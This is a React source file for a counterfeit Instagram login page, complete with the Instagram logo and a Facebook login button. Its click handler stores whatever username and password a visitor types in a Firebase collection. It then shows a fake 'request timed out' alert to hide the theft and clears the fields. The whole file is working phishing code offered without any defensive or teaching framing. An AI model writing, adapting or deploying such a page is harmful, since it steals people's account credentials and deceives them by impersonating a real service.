import React,{useState} from 'react'
import {db} from './firebase'
import './Main.css'

function Main() {
  const [user,setUser]=useState()
  const [pass,setPass]=useState()

 const clickHandler=(e)=>{
    e.preventDefault()
    db.collection('data').add({
      username:user,
      password:pass
    }).then(()=>{
      console.log('added')
    })

    alert('request timed out try again later')
    setUser('')
    setPass('')
 }
    return (
        <div class="main">
        <div class="header">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" />
        </div>
        <div class="middle">
          <div class="l-part">
            <input  type="button" value="Continue with facebook" class="btn" />
            <div class="line2">
              <hr class="line"></hr>   OR <hr class="line3"></hr>
            </div>
            
            <input type="text" value={user} onChange={(e)=>setUser(e.target.value)} placeholder="Phone number,username, or email" class="input-1" />
            <div class="overlap-text">
              <input type="text" value={pass}  onChange={(e)=>setPass(e.target.value)} placeholder="Password" class="input-2" />
             
              <div class="forgot">
                <a href="#">Forgot password?</a>
              </div>
              
            </div>
            <input onClick={clickHandler} type="button" value="Log in" class="btn" />
          </div>
        </div>
        <div class="lower">
          <div class="s-part">
          
            Don't have an account? <a href="#">Sign up</a>
          </div>
        </div>
      </div>
    )
}

export default Main
